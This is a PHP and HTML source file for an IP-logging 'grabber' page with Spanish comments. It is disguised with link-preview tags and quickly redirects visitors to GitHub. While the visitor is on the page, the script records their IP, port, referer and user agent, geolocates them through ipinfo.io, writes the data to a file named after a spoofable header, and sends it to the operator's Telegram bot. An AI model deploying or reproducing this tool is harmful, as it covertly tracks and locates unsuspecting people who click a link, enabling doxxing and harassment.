<!DOCTYPE html>

<html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Script By TechCodec</title>
        <!--DATOS-->
        <meta property="og:title" content="Script By TechCodec" />
        <meta property="og:description" content="Script By TechCodec" />
        <meta property="og:url" content="https://github.com/TechCodec" />
        <meta property="og:image" content="img.jpeg" />
    </head>
</html>

<?php

    #==========[ Created By TechCodec]==========#
    error_reporting(0);
    date_default_timezone_set('America/Lima');


    #==========[Funcion Para Obtener La Ip]==========#
    function get_client_ip_server() {

        $ipaddress = '';

        if ($_SERVER['HTTP_CLIENT_IP'])
            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];

        else if($_SERVER['HTTP_X_FORWARDED_FOR'])
            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];

        else if($_SERVER['HTTP_X_FORWARDED'])
            $ipaddress = $_SERVER['HTTP_X_FORWARDED'];

        else if($_SERVER['HTTP_FORWARDED_FOR'])
            $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];

        else if($_SERVER['HTTP_FORWARDED'])
            $ipaddress = $_SERVER['HTTP_FORWARDED'];

        else if($_SERVER['REMOTE_ADDR'])
            $ipaddress = $_SERVER['REMOTE_ADDR'];

        else
            $ipaddress = 'UNKNOWN';

        return $ipaddress;
    }

    $fecha = date('h:i A')." - ".date('d/m/y');

    $pag_referer = $_SERVER['HTTP_REFERER'];
    $remot_port = $_SERVER['REMOTE_PORT'];
    $ua = $_SERVER['HTTP_USER_AGENT'];

    $iplog = get_client_ip_server();

    #==========[Redirreccionar a otra pagina]==========#
    $redirect = 'https://github.com/TechCodec';
    echo "<script>location.href='".$redirect."';</script>";

    #==========[Guardar Datos EN .TXT]==========#
    $banner = "#==========[TechCodec❤️]==========#";
    $contenido = "Fecha: ".$fecha."\nIP: ".$iplog."\nPORT: ".$remot_port."\nReferer: ".$pag_referer."\nUser-agent: ".$ua."\n\n".$banner."\n\n";
    #==========[Escribir el contenido]==========#
    $fichero = fopen('ip/'.$iplog.'.txt', 'a');
    fwrite($fichero, $contenido);
    fclose($fichero);

    #==========[Enviar EL Mensaje Por Bot]==========#
    $bot_token = '<BOT TOKEN>';
    $website = "https://api.telegram.org/bot".$bot_token;

    #==========[Obtener Información De La Ip]==========#
    $ipInfo = json_decode(file_get_contents('https://ipinfo.io/'.$iplog.'/json'), true);
    $city = $ipInfo['city'];
    $region = $ipInfo['region'];
    $country = $ipInfo['country'];
    $timezone = $ipinfo['timezone'];
    $isp = $ipInfo['org'];

    #==========[Enviar Los datos por bot]==========#
    if ($iplog) {
        $msg = "".$banner."\n\n<b>Fecha:</b> <code>".$fecha."</code>\n<b>IP:</b> <code>".$iplog.":".$remot_port."</code>\n<b>Location:</b> <code>".$city." - ".$region." - ".$country."</code>\n<b>ISP:</b> <code>".$isp."</code>\n<b>Referer:</b> <code>".$pag_referer."</code>\n<b>User-agent:</b> <code>".$ua."</code>\n\n".$banner."";
        sendMessager('<ID DE TU TELEGRAM>', $msg);
    }

    #==========[Funcion enviar mensaje]==========#
    function sendMessager($chat_id, $message){
        $text = urlencode($message);
        $url = $GLOBALS['website'].'/sendMessage?chat_id='.$chat_id.'&text='.$text.'&parse_mode=Html';
        file_get_contents($url);
    }

?>